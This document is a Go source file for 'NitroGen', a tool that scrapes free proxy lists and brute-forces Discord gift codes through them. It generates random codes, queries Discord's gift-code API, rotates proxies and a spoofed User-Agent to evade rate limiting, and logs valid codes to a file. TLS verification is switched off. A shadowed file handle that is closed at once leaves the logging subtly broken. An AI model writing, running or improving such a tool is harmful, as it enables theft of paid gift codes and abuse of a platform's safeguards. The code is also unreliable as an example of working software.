package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strings"
	"time"

	"github.com/gookit/color"
)

func CallClear() {
	value, ok := clear[runtime.GOOS]
	if ok {
		value()
	} else {
		panic("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
	}
}

var (
	clear              map[string]func()
	proxiesList        []string
	proxyList          []string
	hit                int
	invalid            int
	rateLimited        int
	websiteList        = []string{"https://www.sslproxies.org", "https://free-proxy-list.net", "https://us-proxy.org", "https://socks-proxy.net"}
	websiteParticolari = []string{"https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=All"}
	asciiLogo          string
	checking           bool
	f                  *os.File
)

func init() {
	clear = make(map[string]func())
	clear["linux"] = func() {
		cmd := exec.Command("clear")
		cmd.Stdout = os.Stdout
		cmd.Run()
	}
	clear["windows"] = func() {
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		cmd.Run()
	}
	rand.Seed(time.Now().UnixNano())
	f, err := os.Create("codes.txt")
	if err != nil {
		fmt.Println("An error occurred!!")
		os.Exit(1)
	}
	defer f.Close()
}

func RandStringRunes(n int, letterRunes []rune) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func returnCode() string {
	var code string
	var dict = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	for i := 0; i < 16; i++ {
		code = code + RandStringRunes(1, dict)
	}
	return code
}

func contains(s []string, e string) bool {
	for _, a := range s {
		if a == e {
			return true
		}
	}
	return false
}

func loadProxies() {
	//red := color.FgRed.Render
	green := color.FgGreen.Render
	cyan := color.FgCyan.Render
	magenta := color.FgMagenta.Render

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	for {
		CallClear()
		color.Println(magenta(asciiLogo), "\n\n\n\n")
		for webisteN := range websiteList {
			checking = true
			color.Printf("\n%s ==> %s\n", cyan(time.Now().Format("[ 2006-01-02 15:04:05 ]")), green("Scraping Proxies From: ", websiteList[webisteN]))
			resp, _ := client.Get(websiteList[webisteN])
			proxyRegex := regexp.MustCompile(`UTC.\n\n((\s|.)*)</textarea`)
			proxies := proxyRegex.FindAllStringSubmatch(returnBody(resp), -1)[0][1]
			s := strings.Split(proxies, "\n")
			if len(proxyList) > 0 {
				appoggio := []string{}
				for i := range s {
					if contains(proxyList, s[i]) == false {
						if len(s[i]) > 2 {
							appoggio = append(appoggio, s[i])
						}
					}
				}
				proxiesList = append(proxiesList, appoggio...)
				proxyList = append(proxyList, appoggio...)
				appoggio = nil
			} else {
				proxyList = append(proxyList, s...)
			}
		}
		checking = false
		proxiesList = append(proxiesList, proxyList...)
		color.Println("\n\n")

		for proxyN := range proxiesList {
			go generator(proxiesList[proxyN])
		}
		proxiesList = nil
		time.Sleep(10 * time.Second)
	}

}
func returnBody(response *http.Response) string {
	bodyBytes, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return ""
	}
	bodyString := string(bodyBytes)
	return string(bodyString)
}

func Printo() {
	red := color.FgRed.Render
	green := color.FgGreen.Render
	cyan := color.FgCyan.Render
	magenta := color.FgMagenta.Render
	if checking == false {
		color.Printf("\033[2K\r%s %s ==> %s %s %s", magenta("[ NitroGen ]"), cyan(time.Now().Format("[ 2006-01-02 15:04:05 ]")), green("[ HITS - ", hit, " ]"), cyan("[ LIMITED - ", rateLimited, " ]"), red("[ INVALID - ", invalid, " ]"))
	}
}

func generator(proxy string) {
	var proxyURL *url.URL
	proxyString := "http://" + proxy
	proxyURL, _ = url.Parse(proxyString)

	tr := &http.Transport{
		Proxy:           http.ProxyURL(proxyURL),
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}

	for {

		reqUrl := "https://discordapp.com/api/v6/entitlements/gift-codes/" + returnCode()
		req, _ := http.NewRequest("GET", reqUrl+"?with_application=false&with_subscription_plan=true", nil)
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0")
		resp, err := client.Do(req)
		if err != nil {
			return
		} else {
			defer resp.Body.Close()
			var result map[string]interface{}
			err := json.Unmarshal([]byte(returnBody(resp)), &result)
			if err != nil {
				return
			} else {
				if result["message"].(string) == "Unknown Gift Code" {
					invalid++
					Printo()
					time.Sleep(2 * time.Second)
				} else if result["message"].(string) == "You are being rate limited." {
					if result["retry_after"].(float64) < 30 {
						time.Sleep(time.Duration(result["retry_after"].(float64)) * time.Second)
					} else {
						rateLimited++
						return
					}
					Printo()
				} else {
					hit++
					_, err2 := f.WriteString(reqUrl + "\n")
					if err2 != nil {
						os.Exit(1)
					}
					Printo()

				}
			}
		}
	}
}

func main() {
	magenta := color.FgMagenta.Render
	asciiLogo = `
-------------------------------------------------------------------------------------
|                                                                                   |
|                                                                                   |
|       ███    ██ ██ ████████ ██████   ██████   ██████  ███████ ███    ██           |
|       ████   ██ ██    ██    ██   ██ ██    ██ ██       ██      ████   ██           |
|       ██ ██  ██ ██    ██    ██████  ██    ██ ██   ███ █████   ██ ██  ██           |
|       ██  ██ ██ ██    ██    ██   ██ ██    ██ ██    ██ ██      ██  ██ ██           |
|       ██   ████ ██    ██    ██   ██  ██████   ██████  ███████ ██   ████           |
|                                                                                   |
|                                                                                   |
|  <red>!USE AT YOUR OWN RISK!</>                  <green>1.0</>                  <green>Made By Fratellino</>  |
------------------------------------------------------------------------------------
	`
	CallClear()
	color.Print(magenta(asciiLogo), "\n\n\n\n")
	loadProxies()
}
